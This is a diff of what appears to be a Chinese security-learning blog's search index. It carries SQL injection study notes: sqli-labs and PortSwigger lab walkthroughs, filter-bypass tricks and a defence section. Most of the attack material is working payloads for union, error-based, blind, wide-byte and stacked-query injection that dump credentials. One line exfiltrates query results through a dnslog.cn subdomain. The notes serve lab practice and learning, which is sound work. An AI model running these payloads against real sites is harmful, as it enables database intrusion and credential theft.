+<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><code>limit m,n</code></p>
+<p>其中，m是偏移量，n是要查询的数量。</p>
+<blockquote>
+<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
+</blockquote>
+<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
+<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
+<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
+<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
+</li>
+<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
+</li>
+<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
+</li>
+<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
+<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
+<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
+</li>
+</ol>
+<p>危险参数过滤：</p>
+<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
+<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
+<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
+<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
+<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
+<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>Mysql爆破语句</tag>
+        <tag>注入绕过</tag>
+        <tag>sql注入技巧</tag>
+        <tag>sql注入防御</tag>
       </tags>
   </entry>
   <entry>
@@ -17050,186 +17431,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sqli-labs</title>
-    <url>/2023/05/20/sqli-labs/</url>
-    <content><![CDATA[<p>做题记录存在自己的有道云上，准备挑选后再刷一遍，慢慢更新。</p>
-<h2 id="less-9-（单引号时间盲注）"><a href="#less-9-（单引号时间盲注）" class="headerlink" title="less 9 （单引号时间盲注）"></a>less 9 （单引号时间盲注）</h2><p>id&#x3D;1 id&#x3D;1’没有回显</p>
-<p>尝试id&#x3D;1’ and sleep(5)–+ 5s后显示  (注释符#也是没用的)</p>
-<p>id&#x3D; 1’ and if(length(database())&gt;0,sleep(5),1)–+</p>
-<p>id&#x3D;1’ and if(substr(database(),1,1)&gt;’a’,sleep(5),1)–+</p>
-<p>或者</p>
-<p>if(ascii(substr(database(),1,1))&gt;64,sleep(5),1)–+ 也是可以的</p>
-<p>爆破即可</p>
-<h3 id="dnslog注入"><a href="#dnslog注入" class="headerlink" title="dnslog注入"></a>dnslog注入</h3><p><code>id=1‘ and (select load_file(concat(‘\\\\’,(select hex(user())),‘.ho26y3.dnslog.cn/abc’)))--+</code></p>
-<p><img src="/../../../Typora/img111/image-20230706140021367.png"></p>
-<p>对726F6F7440解码即可</p>
-<h2 id="less-11（post请求注入）"><a href="#less-11（post请求注入）" class="headerlink" title="less 11（post请求注入）"></a>less 11（post请求注入）</h2><p>随便输入账号名ad或者ad”，页面报错，但是输入ad’</p>
-<p>发现提示</p>
-<p><code>...e right syntax to use near &#39;admi&#39; LIMIT 0,1&#39; at line 1</code></p>
-<p>说明是存在字符型注入中的<strong>单引号</strong>注入的</p>
-<p>用order by 尝试后发现存在联合注入的，爆破即可</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523154632755.png" alt="image-20230523154632755"></p>
-<h2 id="less-18（http代理）"><a href="#less-18（http代理）" class="headerlink" title="less 18（http代理）"></a>less 18（http代理）</h2><p>这个输入admin,admin正确账号，显示User agent信息</p>
-<p>抓包，将User-Agent处改为，123’(123,和123”均正常显示)，提示如下：</p>
-<blockquote>
-<p>…right syntax to use near ‘127.0.0.1’, ‘admin’)’ at line 1</p>
-</blockquote>
-<p>可以判定是有单引号的闭合</p>
-<h3 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a>思路1：</h3><p>123’#试试，提示如下</p>
-<blockquote>
-<p>the right syntax to use near ‘’ at line 1</p>
-</blockquote>
-<p>123’’(两个单引号)试试，页面正常，故认为是<strong>闭合了两边的单引号</strong></p>
-<p>（这里一定是原码中有两个用到单引号的参数，见如下的uagent和IP）</p>
-<blockquote>
-<p>$insert&#x3D;”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)”;</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,database()),3) and  &#39; </code>爆库：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>and替换成or也是可以的</p>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) and  &#39; </code>爆表:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^emails,referers,uagents,users’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)),3) and  &#39; </code>爆列:</p>
-<blockquote>
-<p>XPATH syntax error: ‘^id,username,password’</p>
-</blockquote>
-<p><code>123&#39; and updatexml(1,concat(0x5e,(select group_concat(username,&#39;~&#39;,password) from security.users)),3) and  &#39;</code>爆security库下users表中的username和password列：</p>
-<blockquote>
-<p>XPATH syntax error: ‘^Dumb<del>133,Angelina</del>I-kill-you,Du…</p>
-</blockquote>
-<h3 id="思路2："><a href="#思路2：" class="headerlink" title="思路2："></a>思路2：</h3><p>看样子是两个参数，那就是123‘,2)#试试，提示</p>
-<blockquote>
-<p>Column count doesn’t match value count at row 1</p>
-</blockquote>
-<p>再加一个参数试试，123’,1,2)#，闭合成功。</p>
-<p>这里与一般注入不一样，查询方式不是select了，通过源码可以发现是insert语句：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent’, ‘$IP’, $uname)</p>
-</blockquote>
-<p>所以要闭合VALUES.</p>
-<p>利用$uagent，故构建格式，1’,1,1)#</p>
-<p>则：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#, ‘$IP’, $uname)</p>
-</blockquote>
-<p>即：</p>
-<blockquote>
-<p>INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘1’,1,1)#</p>
-</blockquote>
-<p>爆库语句：<code>1&#39;,1,updatexml(1,concat(0x5e,database()),3))#</code></p>
-<blockquote>
-<p>  XPATH syntax error: ‘^security’</p>
-</blockquote>
-<p>其余语句类似思路1。</p>
-<h2 id="less-20-cookie注入"><a href="#less-20-cookie注入" class="headerlink" title="less 20 (cookie注入)"></a>less 20 (cookie注入)</h2><h3 id="思路1：-1"><a href="#思路1：-1" class="headerlink" title="思路1："></a>思路1：</h3><p>有一个正确的账号密码登录后，显示了cookie信息</p>
-<p>admin’，有报错信息…LIMIT..</p>
-<p>注释掉后，即admin’#，页面正常。</p>
-<p><code>Cookie: uname=admin&#39; order by 3#</code>正常，4报错，故有3列</p>
-<p><code>Cookie: uname=-admin&#39; union select 1,database(),3 #</code>联合注入即可。</p>
-<h3 id="思路2：-1"><a href="#思路2：-1" class="headerlink" title="思路2："></a>思路2：</h3><p><code>Cookie: uname=-admin&#39; and updatexml(1,concat(&#39;!&#39;,database()),3)#</code></p>
-<p>嗯，报错注入也是可行的</p>
-<h2 id="less-38"><a href="#less-38" class="headerlink" title="less 38"></a>less 38</h2><p>id&#x3D;1’ 报错</p>
-<p>id&#x3D;1’–+回显成功<br><code>?id=0&#39; union select 1,user(),database(); insert into users(username,password) values(&#39;stack&#39;, &#39;stack&#39;)%23</code></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入-tips</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
-    <content><![CDATA[<h2 id="爆破语句"><a href="#爆破语句" class="headerlink" title="爆破语句"></a>爆破语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列</span><br><span class="line"></span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段</span><br></pre></td></tr></table></figure>
-
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>其实注释本来的作用也就是闭合语句</strong></p>
-<p><strong>;%00</strong>代替–+进行注释</p>
-<p>闭合就是针对输入的，一般会对输入的参数再加上一对单引号</p>
-<h2 id="括号判断"><a href="#括号判断" class="headerlink" title="括号判断"></a>括号判断</h2><p>小括号判断：2’ and ‘1’&#x3D;’1 如果有括号，回显为id&#x3D;1页面</p>
-<p>没括号则是id&#x3D;2页面</p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131633798.png" alt="image-20230523131633798"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523131638108.png" alt="image-20230523131638108"></p>
-<h2 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h2><blockquote>
-<p>union select绕过 ：&#x2F;<strong>&#x2F;UNION&#x2F;</strong>&#x2F;SELECT&#x2F;**&#x2F;</p>
-</blockquote>
-<blockquote>
-<p>%75%6e%6f%69%6e %73%65%6c%65%63%74</p>
-</blockquote>
-<p>[SQL注入绕过关键词过滤的小技巧及原理（union select为例）_sql注入关键字过滤绕过_桑榆__的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request_id%22:%22167955372116800192238946%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955372116800192238946&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=union">https://blog.csdn.net/weixin_54848371/article/details/120423529?ops_request_misc=%7B%22request%5Fid%22%3A%22167955372116800192238946%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167955372116800192238946&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-120423529-null-null.142^v76^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=union</a> select绕过&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<h3 id="空格、注释绕过"><a href="#空格、注释绕过" class="headerlink" title="空格、注释绕过"></a>空格、注释绕过</h3><p>空格绕过：%0B代替空格，括号绕过 and(1&#x3D;0)</p>
-<p>注释绕过：用<strong>单引号闭合</strong>替代注释或者使用**;%00替代**。</p>
-<p>例如:?id&#x3D;1’ union select 1,2,3 and ‘1’&#x3D;’1</p>
-<h3 id="引号被注释"><a href="#引号被注释" class="headerlink" title="引号被注释"></a>引号被注释</h3><p><strong>闭合的用%df来（宽字节），字符串值处用16进制来</strong></p>
-<p><strong>mysql_real_escape_string() 函数</strong></p>
-<p>用来<a href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89&spm=1001.2101.3001.7020">转义</a> SQL 语句中使用的字符串中的特殊字符。如果成功，则该函数返回被转义的字符串(即在字符前加”&quot;)。如果失败，则返回 false。</p>
-<h2 id="宽字节注入-df"><a href="#宽字节注入-df" class="headerlink" title="宽字节注入%df"></a>宽字节注入%df</h2><p><a href="https://blog.csdn.net/m0_63303407/article/details/127204281?ops_request_misc=%7B%22request_id%22:%22167955936416782427413061%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167955936416782427413061&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-127204281-null-null.142%5Ev76%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%AE%BD%E5%AD%97%E8%8A%82%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">slilabs靶场记录宽字节绕过(七)_mysql_real_escape_string 绕过_wanan0red的博客-CSDN博客</a></p>
-<ul>
-<li>宽字节注入的本质是PHP与MySQL使用的字符集不同，只要低位的范围中含有0x5c的编码，就可以进行宽字节注入。</li>
-<li>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</li>
-</ul>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-<blockquote>
-<p><code>uname=%df&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=</code><strong>0x7365637572697479</strong>) #&amp;passwd&#x3D;1&amp;submit&#x3D;Submit (字符串附近的引号用%df不行，所以将值转化为十六进制，0x…)</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132005607.png" alt="image-20230523132005607"></p>
-<h3 id="宽字节注入的防御："><a href="#宽字节注入的防御：" class="headerlink" title="宽字节注入的防御："></a>宽字节注入的防御：</h3><p><img src="/../../../Typora/img111/image-20230523132040435.png" alt="image-20230523132040435"></p>
-<h3 id="limit-0-1"><a href="#limit-0-1" class="headerlink" title="limit 0,1"></a>limit 0,1</h3><p>[MySQL 分页查询limit性能缺陷和优化方案_limit性能问题_西瓜游侠的博客-CSDN博客](<a href="https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&request_id=&biz_id=102&utm_term=mysql">https://blog.csdn.net/hbtj_1216/article/details/117190087?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=mysql</a> limit漏洞&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-2-117190087.142^v80^insert_down38,201^v4^add_ask,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
-<p><code>limit m,n</code></p>
-<p>其中，m是偏移量，n是要查询的数量。</p>
-<blockquote>
-<p>当偏移量m过大的时候，查询效率会很低。因为MySQL是先查出m+n个数据，然后抛弃掉前m个数据。</p>
-</blockquote>
-<p><strong>limit 0,1从第一行开始，返回一行</strong></p>
-<p><strong>limit 1,1从第二行开始，返回一行</strong></p>
-<p><strong>limit 2,1从第三行开始，返回一行</strong></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132214461.png" alt="image-20230523132214461"></p>
-<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230523132219086.png" alt="image-20230523132219086"></p>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ol>
-<li><p>参数化查询（数据库服务器在数据库完成SQL指令的编译后，才套用参数运行，因此就算参数中含有有损的指令，也不会被数据库所运行，仅认为它是一个参数。），最好设定传入参数类型，比如是否是数字，<strong>is_numeric($_GET[‘id’])</strong> ，这样就限制了字符的输入。</p>
-</li>
-<li><p>参数长度限制，在PHP下，可用strlen函数检查输入长度</p>
-</li>
-<li><p>函数过滤转义，如addslashes()，它转义一些特殊字符</p>
-</li>
-<li><p>预编译语句，即将要执行的sql语句固定下来，将所传入的参数绑定为一个变量，用”?”表示。</p>
-<p><code>query=&quot;select password from users where username=&#39;admin&#39; or 1=1 &quot;;</code></p>
-<p>这样的话，<strong>admin’ or 1&#x3D;1</strong> 将作为username的值，避免了sql语句的拼接闭合等非法操作。</p>
-</li>
-</ol>
-<p>危险参数过滤：</p>
-<p>1）黑名单过滤：将一些可能用于注入的敏感字符写入黑名单中，如’（单引号）、union、select等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
-<p>2）白名单过滤：例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
-<p>3）参数转义：对变量默认进行addsalashes（在预定义字符前添加反斜杠），使得SQL注入语句构造失败。</p>
-<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以黑名单+参数转义方式为主，这也是目前针对SQL敏感参数处理的主要方式，以下逐项进行分析。</p>
-<h2 id="内敛执行"><a href="#内敛执行" class="headerlink" title="内敛执行"></a>内敛执行</h2><p><code>select/*!user*/  from users;</code></p>
-<p><a href="http://t.csdn.cn/UD0iS">参考Zero_Adam</a></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>Mysql爆破语句</tag>
-        <tag>注入绕过</tag>
-        <tag>sql注入技巧</tag>
-        <tag>sql注入防御</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入之报错注入</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
@@ -17254,51 +17455,6 @@
       </categories>
       <tags>
         <tag>报错注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入之联合注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
-<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
-<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
-<p>1、    判断注入点</p>
-<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
-<p>2、    判断<strong>闭合</strong>形式</p>
-<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
-<p>3、判断查询列数</p>
-<p>1’ order by 1–+</p>
-<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
-<p>20231008<strong>更新一下</strong></p>
-<p>除了order by，还可以用以下方式</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">+</span><span class="keyword">union</span><span class="operator">+</span><span class="keyword">select</span><span class="operator">+</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
-
-<p>然后，尝试替换位置</p>
-<blockquote>
-<p>平时都是union select 1,2,3，这种方法失效了嘞</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="operator">%</span><span class="number">27</span>qn<span class="operator">%</span><span class="number">27</span><span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,<span class="operator">%</span><span class="number">272</span><span class="operator">%</span><span class="number">27</span><span class="comment">--+ #两个位置都有的话</span></span><br><span class="line"></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>username,password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+ #替换字段</span></span><br><span class="line"></span><br><span class="line">#如果只能显示一个位置</span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,username<span class="operator">||</span><span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span><span class="operator">||</span>password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line"><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="keyword">NULL</span>,concat(username,<span class="operator">%</span><span class="number">27</span><span class="operator">~</span><span class="operator">%</span><span class="number">27</span>,password)<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>users<span class="comment">--+</span></span><br><span class="line">#wiener<span class="operator">~</span><span class="number">5</span>qgm</span><br><span class="line"></span><br><span class="line">#数据库信息</span><br><span class="line"></span><br><span class="line">Database type	Query</span><br><span class="line">Microsoft, MySQL	<span class="keyword">SELECT</span> @<span class="variable">@version</span></span><br><span class="line">Oracle	<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> v$version</span><br><span class="line">PostgreSQL	<span class="keyword">SELECT</span> version()</span><br><span class="line"></span><br><span class="line">s<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">271</span><span class="operator">%</span><span class="number">27</span>,(<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>@<span class="variable">@version</span>)<span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; union select &#x27;</span><span class="number">1</span><span class="string">&#x27;,(version())--</span></span><br><span class="line"><span class="string">#如果成功，证明是一个MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#列出数据库内容</span></span><br><span class="line"><span class="string">#除了Oracle，大部分数据库都有一套自己的information_schema</span></span><br><span class="line"><span class="string">#以postgresql为例</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆数据库的表名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,table_name <span class="keyword">from</span> information_schema.tables<span class="comment">--</span></span><br><span class="line">#<span class="string">&#x27; union select NULL,(select table_name from #information_schema.tables)-- 不行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#它还必须有一个是NULL，不像sqli-lab的 union select 1,table_name from...</span></span><br><span class="line"><span class="string">#貌似也没有  union select 1,(select * from information_schema.tables),3--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#爆表的列名</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users_edheuq&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">#爆列的字段</span><br><span class="line"><span class="string">&#x27; union select username_cnxxxn,password_omaiyx from users_edheuq--</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
-
-<p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
-<p>4、判断显示位</p>
-<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
-<p>常用语句为-1’ union select 1,2,3–+</p>
-<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
-<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
-<p>5、获取所有数据库名</p>
-<p>6、获取数据库所有表名</p>
-<p>7、获取字段名 </p>
-<p>8、获取字段中的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
-
